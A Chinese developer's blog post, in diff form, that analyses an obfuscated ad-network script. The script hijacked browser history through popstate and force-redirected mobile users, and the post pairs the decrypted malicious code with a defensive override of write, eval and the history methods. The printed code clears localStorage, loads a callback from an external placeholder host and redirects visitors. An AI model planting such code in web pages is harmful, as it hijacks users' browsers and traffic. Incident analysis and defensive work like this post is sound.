@@ -1,0 +1,205 @@
+一个popstate的bug引起的雪崩
+小爝
+1 个月前
+今天的故事有点长，我慢慢给大家讲。
+
+首先，我们接到用户投诉，在某些网络运营商的网络下，某些android机型的浏览器中，访问我们的页面会有一些诡异的行为。
+
+一，起因：
+
+行为表现是，进入页面后，什么都不操作，页面加载完毕后，用户的浏览器居然直接跳转到了某个网站的一个搜索页面，每次搜索的结果还都不一样。
+
+一开始我们发现了这个bug后，是非常被动的，因为用户进行了录屏操作，确实是什么都没干页面就自动跳转到某网站搜索了，我们模拟了投诉用户的网络，UA，android同款机型都无解，全程页面都是使用的HTTPS链接，DNS排查后没有被劫持。
+
+二，排查：
+
+因为无法复现，所以这个问题大概发生了大概一周左右，而且概率不大，后来我们模拟了用户的ip段，对其进行了小概率的复现，然后追查网络链路，定位了最后的问题。
+
+引起这个的原因，是由于我们的页面引入了某些第三方平台的广告联盟脚本，而广告的插入方式大家都知道，是以下几个步骤组成的：
+
+1，加载第三方广告脚本。
+
+2，第三方脚本根据规则动态获取广告展示脚本。
+
+3，插入广告展示脚本到广告主页面。
+
+问题就出现在广告脚本这一块，也就是第二步。
+
+通过对日志的排查，复现的脚本，会有小概率的情况在页面中增加一些私货，而且是通过eval加密的，具体加密方法其实就是下面这个地址生成的：js的eval方法在线加密解密工具
+
+那么这段代码做了什么呢？
+
+通过对加密代码进行解密，我们发现他干了一件非常神奇的事，这件事就和popstate有关了。
+
+直接上一下解密后的核心部分代码：
+
+window.loadKeyWord = function(wd) {
+        (function(window, location, wd) {
+          history.replaceState(null, document.title, location.pathname + "#!/stealingyourhistory");
+          history.pushState(null, document.title, location.pathname);
+          window.addEventListener("popstate",
+            function() {
+              if (location.hash === "#!/stealingyourhistory") {
+                history.replaceState(null, document.title, location.pathname);
+                setTimeout(function() {
+                    var h = self,
+                      d = document;
+                    var i = d.URL,
+                      n = d.location,
+                      q = d.body,
+                      B = function(b) {
+                        !!h.localStorage && localStorage.clear();
+                        //replace ie写法
+                        (1 - 0.1).toFixed(0) == 0 ? n.replace(b) : !!h.openDatabase ? ~
+                          function(a, c) {
+                            a.rel = 'noreferrer';
+                            a.href = b;
+                            q.insertBefore(a, q.firstChild);
+                            try {
+                              a.click()
+                            } catch (z) {
+                              c = d.createEvent('Event');
+                              c.initEvent('click', !1, !1);
+                              a.dispatchEvent(c)
+                            }
+                          }(d.createElement('a')) : ~
+                          function(a) {
+                            d.open();
+                            d.write(a);
+                            d.close()
+                          }('<meta http-equiv="refresh" content="0;url=' + b + '"/>')
+                      };
+                    var tt = wd;
+                    if (tt) {
+                      B("xxxxxxxx")
+                    }
+                  },
+                  0)
+              }
+            },
+            false)
+        }(window, location, wd))
+      }
+      var hm = document.createElement("script");
+      hm.src = "xxxxx.com/?callback=loadKeyWord";
+      hm.async = true;
+      hm.type = "text/javascript";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s)
+简单解释一下，定义的loadKeyWord方法等于是一个全局的jsonp回调，然后恶意脚本通过调用另外一个script来触发这个方法的执行，传回来的就是每次不一样的关键字结果。
+
+那么我们来简单分析一下，这个loadKeyWord方法干了点啥。
+
+1，调用了replaceState方法进行了一次当前url的历史记录替换操作，这个记录加上了 stealingyourhistory 这个hash值。
+
+2，调用pushState方法把当前页面的url换回来了，这样保证如果用户点击了后退，那么就会回到带有stealingyourhistory的这个值。
+
+3，如果用户点击后退，会触发popstate事件，这个时候，正好会进入下面他增加的监听，判断如果url带着stealingyourhistory，那么就会触发他的恶意逻辑。
+
+4，恶意逻辑写的就比较简单了，一系列的浏览器检测后，不同的浏览器选择不同的跳转方式，比如location.replace，比如自己创建一个a标签自己模拟点击，还有最狠的是在页面里插入一个refresh meta来进行重定向。
+
+明白了这个逻辑，大概的一个攻击脚本就分析完了，那么为什么用户会不点后退，进入页面就自动跳转了呢？
+
+哈哈，因为本身popstate在规范上写的是只有用户点击了前进后退，对历史记录进行操作才会触发的，但是在webkit中他是有bug的，当浏览器打开一个新页面或者刷新页面，都会触发popstate，遇到这个bug的人一般都是在onload执行完毕后再setTimeout一下进行popstate的绑定的，但是这个恶意脚本应该是没有考虑到，直接进行绑定了。
+
+那么这个投诉的场景就复现了：
+
+1，一个用户的浏览器中了恶意脚本规则。
+
+2，恶意脚本进行jsonp的回调，触发恶意逻辑。
+
+3，进行stealingyourhistory操作。
+
+4，页面这个过程还没onload。
+
+5，页面onload了，触发了popstate事件，页面被直接带走了。
+
+三，解决：
+
+我们知道了触发原因，破解了恶意脚本逻辑，因为众所周知的原因，广告平台肯定是不认账的，处理肯定也不会那么及时，那么如何快速临时的解决一下呢？
+
+处理这种拦截的解决办法，一般都是对恶意脚本的一些关键api进行沙盒处理，我们先看下对方脚本做的事。
+
+1，用到了document.write来进行了meta refresh的写入。
+
+2，用到了location.replace进行重定向。
+
+3，用到了模拟点击a标签。
+
+如果只是重写document.write就能解决那就好办了，但是因为跳转方式的多样化，我们换个思路。
+
+脚本触发的过程其实本质是对history的几个方法的利用，那么我们其实只需要对这几个方法进行拦截就可以了。
+
+看下关键代码：
+
+function rewrite() {
+  var win = window,
+    doc = document,
+    docWriteln = doc.writeln,
+    docWrite = doc.write,
+    oldEval = eval,
+    addEvent = win.addEventListener,
+    histryReplaceState = history.replaceState,
+    histryPushState = history.pushState;
+   Object.defineProperties(win,{
+       addEventListener:{
+       value:genMethod(addEvent,filterPopstate,win),
+       writable: false,
+       configurable: false
+     }
+   });
+  Object.defineProperties(doc, {
+    write: {
+      value: genMethod(docWrite, filterWrite, doc),
+      writable: false,
+      configurable: false
+    },
+    writeln: {
+      value: genMethod(docWriteln, filterWrite, doc),
+      writable: false,
+      configurable: false
+    }
+  })
+  Object.defineProperties(win, {
+    eval: {
+      value: genMethod(oldEval, null, win),
+      writable: false,
+      configurable: false
+    }
+  });
+  Object.defineProperties(history, {
+    replaceState: {
+      value: genMethod(histryReplaceState, filterreplace, history),
+      writable: false,
+      configurable: false
+    },
+    pushState: {
+      value: genMethod(histryPushState, null, history),
+      writable: false,
+      configurable: false
+    }
+  });
+}
+rewirte函数对这些关键方法，比如write，writeln，replaceState，pushState，eval进行了重定义。
+
+然后我们关注一下value的部分，我这里使用了一个方法来复用重写逻辑，因为要完全代理原来的方法，我们需要把scope，原始方法，过滤方法都传进去。
+
+function genMethod(oldMethod, filterFn, scope) {
+  return function() {
+    var args = Array.from(arguments);
+    if (filterFn) {
+      if(filterFn(args)) return oldMethod.apply(scope, args);
+    } else {
+      return oldMethod.apply(scope, args);
+    }
+  }
+}
+这里需要注意的是我们因为重写了eval方法，在apply调用的时候需要把返回值返回去，如果你想对你网站所有的这种方法做监控，当然你也可以在genMethod方法中加入上报的埋点，这个就看个人需要了。
+
+因为我们有了对方法参数的过滤机制，所以我们通过过滤popstate的callback.toString()来进行了渠道号和某网站URL的正则匹配，又对write方法等做了一些关键字的过滤，如果命中就不会执行，测试可以快速解决这个强制跳转和拦截后退的恶意脚本。
+
+四，总结
+
+最后我们也和某网站，也就是收益方进行了沟通，确认应该是某些广告商的作弊行为导致的，当然这种问题的排查和追踪比较困难，以上都只是一些不得已而为之的处理方式，最后肯定是要从拦截的源头来进行处理了。
+
+而这一系列的广告黑产技术的破解，被发现的原因居然是因为popstate的一个bug而引起大范围反馈和排查的，这真是让我们哭笑不得
